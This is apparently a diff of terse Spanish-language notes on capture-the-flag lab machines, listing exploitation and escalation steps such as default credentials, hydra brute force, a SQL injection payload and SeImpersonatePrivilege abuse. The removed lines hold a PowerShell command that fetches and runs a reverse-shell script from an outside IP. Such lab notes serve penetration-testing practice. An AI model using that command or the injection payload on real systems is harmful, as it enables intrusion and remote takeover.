@@ -1,20 +1,19 @@
 ## Alfred
-explotacion en el puerto 8080 credenciales admin admin, se crea un proyecto libre y se ejecuta un comando de windows en buil
-powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.87.166:4444/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port >
-escalacion: token seimpersonalprivilege
+explotacion en el puerto 8080 credenciales admin admin, se crea un proyecto libre y se ejecuta un comando de windows en buil;
+escalacion: token seimpersonalprivilege;
 
 ## Brainpan_1
 Buffer overflow
 
 ## Gamezone
-explotacion: sqlinjection ' or 1=1 -- -
+explotacion: sqlinjection ' or 1=1 -- -\
 sqlmap
 puertos no expuestos
 
 
 ## HackPack
-explotacion: puerto 80 login fuerza bruta burbpsuit hydra
-credenciales: admin : 1qaz2wsx
+explotacion: puerto 80 login fuerza bruta burbpsuit hydra;
+credenciales: admin : 1qaz2wsx;
 explotacion version
 escalacion: servicio en ejecucion
 
@@ -48,8 +47,7 @@ exploit: version joomla
 buffer overflow
 
 ## Overpass_2                                                                              
-Identificar el atacante como tuvo acceso a la maquina
-wireshark
+Identificar con wireshark el atacante como tuvo acceso a la maquina
 
 ## Skynet
 explotacion; listar directorios con smbclient
